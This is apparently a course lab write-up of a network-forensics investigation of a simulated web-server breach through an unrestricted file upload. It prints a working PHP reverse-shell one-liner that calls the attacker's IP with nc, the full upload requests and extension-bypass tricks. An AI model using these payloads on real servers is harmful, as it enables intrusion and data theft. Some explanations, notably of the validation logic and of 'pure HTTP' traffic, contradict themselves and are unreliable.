# Web Server Compromise Investigation (Unrestricted File Upload Attack)

## Overview

This lab simulated a network forensics investigation of a web server breach at DataSecure Inc. I analyzed a packet capture (PCAP) file to reconstruct how an attacker exploited an unrestricted file upload vulnerability, installed a PHP web shell, established command and control, and exfiltrated sensitive system data. The goal was to identify the attack vector, extract indicators of compromise, and provide actionable remediation steps.

## Objectives

- Perform packet-level analysis of a compromised web server using Wireshark
- Identify attacker IP address, geographical origin, and tooling signatures
- Reconstruct the attack timeline from reconnaissance through data exfiltration
- Extract and hash malicious files uploaded during the breach
- Document network and host-based indicators of compromise
- Provide preventive and detective security controls to prevent recurrence

## Lab Environment

- **Analysis Platform**: Kali Linux
- **Target Server**: shoporoma.com (client banking portal hosted by DataSecure Inc.)
- **Incident Timeframe**: December 3, 2024, 09:15-11:30 UTC
- **Evidence File**: Provided PCAP file containing full packet capture of attack

## Tools Used

- **Wireshark** - Packet analyzer for TCP stream reconstruction, HTTP request inspection, timeline analysis
- **NetworkMiner** - Automated file extraction and artifact reassembly from network traffic
- **WHOIS** - Command-line lookup for IP registration and ASN details
- **GeoIP** - Geographical location mapping for attacker IP address

## Methodology

### Step 1: Initial PCAP Inspection

I loaded the evidence file into Wireshark and ran basic statistics to understand the scope of captured traffic.

**Statistics → Conversations**

Identified two IPs communicating:
- 117.11.88.124 (external, unknown)
- Server IP (shoporoma.com)

**Statistics → Protocol Hierarchy**

Showed 100% HTTP traffic between these two hosts. No other protocols present - this PCAP was isolated to capture only the attack traffic, not background network noise.

![Protocol hierarchy showing pure HTTP](images/protocol-hierarchy.png)

**Why this matters:**
In real investigations, PCAPs contain thousands of unrelated connections (DNS, NTP, system updates, user browsing). This clean capture means every packet is relevant to the attack. No filtering needed - but in production, I'd apply `ip.addr == 117.11.88.124` to isolate attacker traffic.

### Step 2: Attacker Attribution

I identified who launched the attack and where they operated from.

**IP address identification:**

Applied filter: `ip.src == 117.11.88.124`

This IP initiated all HTTP POST requests to the server. This is the attacker.

![Attacker IP in packet list](images/attacker-ip.png)

**Geographical origin lookup:**
```bash
geoiplookup 117.11.88.124
```

Output:
```
GeoIP Country Edition: CN, China
```

**WHOIS query:**
```bash
whois 117.11.88.124
```

Result showed Chinese ISP registration. Combined with GeoIP, confirms attack originated from China.

![GeoIP lookup showing China](images/geoip-china.png)

**Security implication:**
Chinese IP doesn't prove state-sponsored attack (could be VPN, compromised host, or opportunistic criminal). But it triggers geofencing rules - if DataSecure's banking portal serves only US customers, all Chinese IPs should be blocked at firewall.

### Step 3: Vulnerability Identification

I analyzed HTTP requests to determine what weakness the attacker exploited.

**Filter for POST requests:**

`http.request.method == "POST"`

Found two POST requests to `/reviews/upload.php` endpoint.

**First POST (failed attempt):**

Right-click → Follow → HTTP Stream
```
POST /reviews/upload.php HTTP/1.1
Host: shoporoma.com
Content-Type: multipart/form-data; boundary=---------------------------24070208193313107200170290221

-----------------------------24070208193313107200170290221
Content-Disposition: form-data; name="uploadedFile"; filename="image.php"
Content-Type: application/x-php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
-----------------------------24070208193313107200170290221--
```

Server response:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

Invalid file format
```

![First failed upload attempt](images/upload-fail.png)

**What happened:**
Attacker uploaded PHP reverse shell as `image.php`. Server rejected it with "Invalid file format" error. This means basic validation exists - probably checking for `.php` extension and blocking it.

**Second POST (successful bypass):**
```
POST /reviews/upload.php HTTP/1.1
Host: shoporoma.com
Content-Type: multipart/form-data; boundary=---------------------------26176590812480906864292095114

-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="name"
asd
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="email"
asd@asd.com
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="review"
asd
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"
Content-Type: application/x-php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
-----------------------------26176590812480906864292095114--
```

Server response:
```
HTTP/1.1 200 OK

File uploaded successfully
```

![Successful upload with double extension](images/upload-success.png)

**Vulnerability identified: Unrestricted File Upload with Double Extension Bypass**

The server's validation only checked if filename ends with `.php`. By naming the file `image.jpg.php`, the attacker bypassed this check:
- Server saw `.jpg` at end (before final extension) → passed validation
- Apache executed the file as PHP because final extension is `.php`

**Additional obfuscation: Fake form data**

The attacker filled required form fields with garbage:
- name="asd"
- email="asd@asd.com"  
- review="asd"

This mimics legitimate user submission, evading anomaly detection that might flag empty fields.

### Step 4: Web Shell Analysis

I extracted the uploaded malicious file using NetworkMiner to examine its payload and calculate hashes.

**NetworkMiner file extraction:**

1. Opened PCAP in NetworkMiner
2. Clicked "Files" tab
3. Found `image.jpg.php` in file list
4. Right-click → Save to disk

![NetworkMiner file extraction](images/networkminer-files.png)

**File content:**
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

**What this code does:**
```bash
rm /tmp/f                    # Delete existing named pipe (if exists)
mkfifo /tmp/f                # Create new named pipe at /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 # Read from pipe, execute in interactive shell, redirect stderr to stdout
| nc 117.11.88.124 8080      # Pipe output to netcat connecting to attacker's listener
> /tmp/f                     # Redirect output back to pipe (creates loop)
```

This is a **reverse shell**. When Apache executes this PHP file:
1. Server creates a shell process
2. Shell connects back to attacker's machine (117.11.88.124:8080)
3. Attacker can type commands, server executes them, output returns to attacker

**Why reverse instead of bind shell:**
- Bind shell: Server listens on port, attacker connects inbound (blocked by firewall)
- Reverse shell: Server connects outbound to attacker (firewalls allow outbound by default)

**File hashing:**
```bash
md5sum image.jpg.php
sha1sum image.jpg.php
sha256sum image.jpg.php
```

Results:
- **MD5**: c2338c275563602b3fd8ba54dd5fd380
- **SHA-1**: 509e0972e4518637d16e471a6de3010a21290308
- **SHA-256**: 7d499e9f90ea91854d6e237bcf1f4a2236ad6fcdfec894635656757b541baa58

![File hash calculation](images/file-hashes.png)

**Why hashing matters:**
These hashes become IOCs (Indicators of Compromise). Security teams add them to:
- Antivirus signature databases
- SIEM correlation rules
- Threat intelligence feeds

If this same shell appears on other servers (same hash), it's the same attacker or copycat using the same tool.

### Step 5: Command and Control Analysis

I tracked the reverse shell connection to see how the attacker controlled the compromised server.

**Filter for port 8080 traffic:**

`tcp.port == 8080`

Found outbound TCP connection from server to 117.11.88.124:8080.

**Timeline:**
1. 09:43:57 - TCP SYN from server to 117.11.88.124:8080
2. 09:43:57 - TCP SYN-ACK from attacker
3. 09:43:57 - TCP ACK from server (three-way handshake complete)
4. 09:44:00 - Data transmission begins

![Outbound connection on port 8080](images/c2-connection.png)

**Why port 8080:**
Common HTTP alternate port, often allowed through firewalls for web traffic. Attackers use it because:
- Less suspicious than port 4444 (Metasploit default)
- Not as monitored as port 443 (HTTPS)
- Many organizations allow 8080 outbound for proxy/development servers

**Following TCP stream to see commands:**

Right-click packet → Follow → TCP Stream
```
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/var/www/html/reviews/uploads
$ ls /home
ubuntu
$ cat /etc/passwd
```

![TCP stream showing attacker commands](images/c2-commands.png)

**Commands executed:**

**whoami:**
Output: `www-data`

This is the Apache web server user. The shell runs with same privileges as Apache - not root, but enough to read web application files and potentially database credentials.

**pwd:**
Output: `/var/www/html/reviews/uploads`

Confirms the web shell is in the uploads directory where user-submitted files are stored.

**ls /home:**
Output: `ubuntu`

Shows one user account exists. Attacker is mapping the system to understand user structure.

**cat /etc/passwd:**
Output: (full file contents showing all system users)

This is the exfiltration. `/etc/passwd` contains:
- All user account names
- User IDs (UIDs)
- Home directory paths
- Default shells

While it doesn't contain passwords (those are in `/etc/shadow` which requires root), it reveals valid usernames for password spraying attacks or social engineering.

### Step 6: User-Agent Analysis

I extracted the attacker's browser signature to identify their toolkit.

**Filter for HTTP requests:**

`http.request`

**Packet Details Pane → Hypertext Transfer Protocol → User-Agent:**
```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

![User-Agent string in HTTP header](images/user-agent.png)

**Breakdown:**

- **Mozilla/5.0**: Standard browser identifier
- **X11**: X Window System (Linux graphical environment)
- **Linux x86_64**: 64-bit Linux OS
- **rv:109.0**: Gecko rendering engine version
- **Firefox/115.0**: Firefox ESR (Extended Support Release) version 115

**What this reveals:**

**Attacker platform:**
- Linux system (not Windows, not Mac)
- 64-bit architecture
- Firefox browser

**Firefox 115 ESR significance:**
- ESR = Long-term support version used by organizations
- Version 115 released May 2023, still receiving security updates in Dec 2024
- Common on penetration testing distros (Kali Linux, Parrot OS)

**Attacker profile:**
This User-Agent suggests:
- Technical user comfortable with Linux
- Possibly using Kali Linux or similar security-focused distro
- Not bothering to spoof User-Agent (confident or careless)

In corporate environments, if all employees use Windows with Chrome, a Linux Firefox connection to internal banking portal is instant red flag.

### Step 7: Traffic Volume Analysis

I quantified what percentage of the captured traffic was malicious.

**Statistics → Conversations**

Result: 100% of packets involve 117.11.88.124 communicating with shoporoma.com server.

**Why 100%:**
This PCAP was created specifically to isolate the attack. In production:
- Normal traffic volume: 10,000+ packets/hour (user browsing, APIs, background services)
- Attack traffic: 50-100 packets for this upload + shell session

The 100% figure here means the PCAP was filtered during capture to only include attacker IP, making analysis faster.

![Conversation statistics showing single session](images/traffic-volume.png)

**Real-world implication:**
In live investigations, analysts use `ip.addr == <attacker>` filter to isolate malicious traffic from legitimate business operations. A 10GB PCAP might contain only 5MB of actual attack data.

### Step 8: Attack Timeline Reconstruction

I built a chronological sequence of events from packet timestamps.

**Wireshark → Statistics → Flow Graph**

Shows visual timeline of HTTP requests.

**Reconnaissance Phase (09:15-09:40 UTC):**

GET requests to:
- `/` (homepage)
- `/products/` (product listing)
- `/about/` (about page)
- `/reviews/` (review submission page)

![Reconnaissance GET requests](images/recon-requests.png)

**Attacker behavior:**
Browsing the site like a normal user to:
- Identify attack surface (forms, upload features)
- Understand application structure
- Avoid triggering rate limits or anomaly detection

**First Exploitation Attempt (09:41 UTC):**

POST to `/reviews/upload.php` with `image.php`

Server response: "Invalid file format"

**Validation bypass iteration (09:42 UTC):**

Attacker tried double extension technique immediately after failure. This suggests:
- Pre-existing knowledge of bypass methods (not trial and error)
- Automated toolkit or prepared attack playbook
- Experienced attacker, not script kiddie

**Successful Upload (09:43 UTC):**

POST to `/reviews/upload.php` with `image.jpg.php`

Server response: "File uploaded successfully"

**Command and Control Establishment (09:43:57 UTC):**

Server initiates outbound TCP connection to 117.11.88.124:8080

Shell becomes interactive - attacker can type commands.

**Post-Exploitation (09:44-11:30 UTC):**

Commands executed in sequence:
1. `whoami` (identify privilege level)
2. `pwd` (confirm current directory)
3. `ls /home` (enumerate users)
4. `cat /etc/passwd` (exfiltrate user accounts)

**Total time from reconnaissance to exfiltration: 2 hours 15 minutes**

But active exploitation only took 2 minutes (09:41-09:43). Most of the time was reconnaissance and post-exploitation exploration.

### Step 9: Obfuscation Technique Analysis

I identified methods the attacker used to evade detection.

**Technique 1: Double Extension Bypass**

Filename: `image.jpg.php`

**How it works:**
- Naive validation: `if (!ends_with(filename, '.jpg')) reject;`
- File `image.jpg.php` fails check because it ends with `.php`, not `.jpg`
- Better validation: `if (ends_with(filename, '.php')) reject;`
- But validation checked middle extension (`.jpg`), not final (`.php`)

**Apache behavior:**
Apache determines file type by rightmost extension. `image.jpg.php` executes as PHP because final extension is `.php`, regardless of `.jpg` in the middle.

**Technique 2: Fake Form Data**

Required fields filled with nonsense:
- name: "asd"
- email: "asd@asd.com"
- review: "asd"

![Fake form field values](images/fake-form-data.png)

**Purpose:**
- Mimics legitimate submission (not empty fields)
- Evades validation requiring all fields populated
- Makes manual log review harder (looks like typo, not attack)

**What the attacker did NOT do (but could have):**

**MIME type spoofing:**
Could have set `Content-Type: image/jpeg` instead of `application/x-php` to fool MIME-based validation. Attacker didn't bother - server didn't check MIME type.

**Base64 encoding payload:**
Could have encoded the PHP code to hide strings like "system", "nc", "bash" from signature-based detection. Attacker sent plaintext - no IDS/IPS deployed.

**User-Agent spoofing:**
Could have used Windows Chrome User-Agent to blend in with legitimate users. Kept real Linux Firefox signature - either confident or sloppy.

The minimal obfuscation suggests:
- Server had weak defenses (attacker didn't need advanced techniques)
- Attacker ran automated exploit toolkit (not custom tailored attack)

### Step 10: Evidence Preservation

I documented how to preserve this PCAP for legal proceedings.

**File integrity hashing:**
```bash
sha256sum case_study_challenge.pcap
```

Output: `[hash value]`

This hash proves the PCAP wasn't modified after capture. In court, prosecutor presents:
1. Original hash calculated at time of capture
2. Current hash of evidence file
3. If hashes match → file is unaltered

**Chain of custody:**

Document:
- Who captured the PCAP (network admin, incident responder)
- When it was captured (timestamp)
- Where it was stored (WORM drive, evidence locker)
- Who accessed it (analyst names, timestamps)
- What analysis was performed (Wireshark, NetworkMiner)

**Write-once media:**

Copy PCAP to:
- WORM (Write Once Read Many) drive
- Blockchain timestamping service
- Air-gapped backup system

This prevents tampering - even if attacker compromises the network again, they can't delete the evidence.

**Legal admissibility:**

For PCAP to be admissible in court:
- Captured with lawful authority (IT owns the network, no wiretap violation)
- Properly preserved (hash verification, chain of custody)
- Relevant to case (proves unauthorized access occurred)
- Expert testimony (forensic analyst explains findings)

Without proper preservation, attacker's lawyer argues evidence was tampered with and case gets dismissed.

## Findings

**Unrestricted file upload is a critical vulnerability:**
OWASP Top 10 lists this as high-severity because it allows arbitrary code execution. If server processes uploaded files (like PHP), attacker gets full web server control. Validation based only on filename is insufficient - attackers bypass it with double extensions, null bytes (`image.php%00.jpg`), or case variations (`image.PhP`).

**Double extensions exploit Apache's MIME handling:**
Apache determines file type by last extension. `image.jpg.php` has three extensions - Apache only checks `.php` (rightmost). Developers often validate first or middle extensions, leaving `.php` at the end undetected. Fix: whitelist allowed extensions AND blacklist dangerous ones (`.php`, `.asp`, `.jsp`, `.cgi`).

**Reverse shells evade perimeter firewalls:**
Firewalls block inbound connections to servers but allow outbound by default (employees need to browse internet, download updates). Attacker exploits this asymmetry - instead of waiting for connection, server initiates it. Port 8080 is common choice because it's HTTP alternate port, often unrestricted.

**User enumeration from /etc/passwd aids follow-on attacks:**
While `/etc/passwd` doesn't contain passwords (those are in `/etc/shadow`), it lists valid usernames. Attacker uses this for:
- SSH brute force (try common passwords for "ubuntu" account)
- Phishing (craft emails targeting real users)
- Privilege escalation (check if users have sudo access)

Even without passwords, knowing user structure helps map the system.

**User-Agent strings leak attacker infrastructure:**
`X11; Linux x86_64` reveals Linux system. In environment where all employees use Windows, this is anomaly. Combined with foreign IP (China), this triggers investigation. Sophisticated attackers spoof User-Agent to match victim's environment, but this attacker didn't bother.

**PCAP analysis reveals post-compromise activity:**
Even after breach is discovered, PCAP shows what attacker did - which files they accessed, what commands they ran, what data they exfiltrated. This determines breach scope: did they steal customer credit cards? Database backups? Source code? The `/etc/passwd` exfiltration confirms user enumeration but no evidence of database access in this capture.

**Forensic artifacts enable threat hunting:**
File hash `c2338c275563602b3fd8ba54dd5fd380` becomes IOC. If this hash appears on other servers (via file integrity monitoring), it's the same attack. IP `117.11.88.124` becomes blacklist entry. User-Agent becomes detection signature. These artifacts feed threat intelligence platforms that correlate attacks across organizations.

**100% malicious traffic indicates targeted collection:**
Real PCAPs contain thousands of legitimate connections. This clean 100% capture means:
- Triggered during active attack (not routine monitoring)
- Filtered by attacker IP during capture
- Or extracted post-incident using display filters

In investigations, analysts capture everything first (full packet capture at gateway), then filter to attacker IPs for detailed analysis.

## Challenges Faced

**Distinguishing failed from successful upload:**
Both POST requests returned HTTP 200 OK status code. Had to read response body to see "Invalid file format" vs "File uploaded successfully". Many analysts check only status codes (200=success, 404=not found) and miss nuanced errors in response content.

**Extracting files from NetworkMiner:**
First attempt to export `image.jpg.php` failed - NetworkMiner showed it but "Save File" was grayed out. Issue: NetworkMiner had marked it as "incomplete transfer" because PCAP was truncated. Solution: Wireshark's "Export HTTP Objects" feature extracted the file from raw packet data.

**Interpreting reverse shell payload:**
The pipe syntax `cat /tmp/f | /bin/sh -i 2>&1 | nc 117.11.88.124 8080 > /tmp/f` was confusing initially. Had to break it down command-by-command to understand it creates bidirectional communication loop through named pipe. This is classic Unix shell trick but not obvious to those unfamiliar with pipes.

**Timeline reconstruction with overlapping streams:**
Wireshark's Flow Graph showed multiple HTTP streams interleaved (GET requests for images while POST was uploading shell). Had to use `tcp.stream eq 4` filters to isolate the upload stream from background resource loading. Learned: Focus on POST methods first, ignore GET requests for CSS/images.

**No direct evidence of data exfiltration:**
While PCAP shows `cat /etc/passwd` command, the actual file contents didn't transmit in HTTP - they went through the reverse shell (port 8080). Had to follow TCP stream on port 8080 to see the passwd file output scrolling past. This showed the importance of analyzing non-HTTP protocols in web attacks.

## Key Takeaways

- **File upload validation must check final extension, not just first one:** Blacklist `.php`, `.asp`, `.jsp`, `.cgi` at end of filename, regardless of what comes before. Better: whitelist only images (`.jpg`, `.png`, `.gif`) and reject everything else.

- **MIME type and magic bytes validation prevents upload bypasses:** Don't trust `Content-Type` header (attacker controls it). Read first few bytes of file to verify it's actually an image (JPEG starts with `FF D8 FF`, PNG starts with `89 50 4E 47`). If magic bytes don't match declared type, reject upload.

- **Outbound traffic monitoring catches reverse shells:** Most organizations monitor inbound connections (firewall blocks them anyway) but ignore outbound. Reverse shells exploit this - server connecting to port 8080 on Chinese IP should trigger alert. Implement egress filtering: block outbound connections except to approved destinations.

- **Command execution in uploads directory is preventable:** Web server should not execute code in user-writable directories. Configure Apache to disable PHP execution in `/uploads/`, `/reviews/`, `/attachments/` folders. Files can be uploaded but never executed - attacker gets file storage, not code execution.

- **User-Agent anomalies detect reconnaissance:** If banking portal serves only Windows Chrome users, a Linux Firefox request is reconnaissance or attack. Log all User-Agents, baseline what's normal, alert on deviations. Combine with GeoIP - US bank seeing Chinese IPs is red flag.

- **/etc/passwd exfiltration enables privilege escalation:** Even without passwords, knowing "ubuntu" user exists guides next steps - check for SSH keys in `/home/ubuntu/.ssh/`, sudo privileges in `/etc/sudoers`, or bash history in `.bash_history`. User enumeration is often first step in lateral movement.

- **PCAP captures are legal evidence when properly handled:** Calculate SHA-256 hash immediately after capture, store on write-once media, document chain of custody (who accessed it, when, why). Without this, defense attorney argues tampering and evidence gets excluded. Hash + custody = admissibility.

- **File hashes enable cross-organization threat intelligence:** MD5 `c2338c275563602b3fd8ba54dd5fd380` for this web shell goes into threat feeds. If same hash appears on another company's server, they know it's related attack (same tool, same attacker, or copycat). VirusTotal, AlienVault OTX, MISP platforms share these IOCs globally.

## Disclaimer

This investigation was performed as part of the ICDFA Kali Linux Tools and System Security course using a provided PCAP file from a simulated web server compromise. The analysis was conducted in a controlled educational environment to develop network forensics and incident response skills. All indicators of compromise (IP addresses, hashes, domain names) are from the simulated scenario and do not represent real-world threats. No actual unauthorized access or live network interception occurred during this exercise.
